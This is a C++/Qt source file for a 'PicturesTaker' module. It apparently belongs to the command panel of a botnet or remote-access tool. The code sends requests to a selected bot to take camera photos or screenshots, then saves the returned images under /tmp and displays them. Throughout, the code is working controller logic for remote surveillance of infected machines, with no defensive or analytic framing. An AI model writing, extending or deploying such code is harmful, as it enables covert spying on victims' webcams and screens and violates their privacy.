#include "PicturesTaker.h"
#include "PicturesTakerDialogue.h"
#include <fstream>


PicturesTaker::PicturesTaker(std::function<void(payload_type, void*, void*)> &callback, void* data){

    this->callback = callback;
    this->target = (QWidget*)data;

    this->moduleWindow = new PicturesTakerDialogue(this, target);
    this->module_id = "picturesTaker";

    connect(this, SIGNAL(openTarget(QString)), moduleWindow, SLOT(openBot(QString)));
    connect(this, SIGNAL(onResult(QString, QString, QString )), moduleWindow, SLOT(handleFile(QString, QString, QString)));

    connect(moduleWindow, SIGNAL(getPicture(QString, QString)), this, SLOT(sendRequest(QString, QString)));
}

void PicturesTaker::executeTask(std::string task, std::string payload, payload_type pt, std::function<void(payload_type, void*, bool)> callback){


    std::string path = "/tmp/pt_res" + task;
    QString type = QString::fromStdString(tasks[task].second);
    if(type == "camera"){
        path+=".jpg";
    } else{
        path+=".png";
    }

    if(pt == payload_type::binary_data){
    std::ofstream file(path);
        if (file.is_open()){
            file << payload.substr(payload.find(' ')+1);
        }
        file.close();
         QString qPath = QString::fromStdString(path);
         QString type = QString::fromStdString(tasks[task].second);
         QString botId = QString::fromStdString(tasks[task].first);
        emit onResult(botId, qPath,  type);
    }
}

QWidget* PicturesTaker::getUI(QString targetId) {
    emit openTarget(targetId);
    return this->moduleWindow;
}

void PicturesTaker::sendRequest(QString botId, QString text){
    controlRequest info;
    std::string payload = text.toStdString();
    std::string task = generate_uuid_v4();
    std::string stdBotId = botId.toStdString();
    std::pair res = std::make_pair(stdBotId, payload);

    info.target_type = targets_enum::bot;
    info.target_module = "picturesTaker";
    info.target_id = stdBotId;
    info.required_response = "one";
    info.task_id = task;

    tasks.insert(tasks.begin(), std::make_pair(task, res));
    callback(payload_type::text, &payload, &info);
}

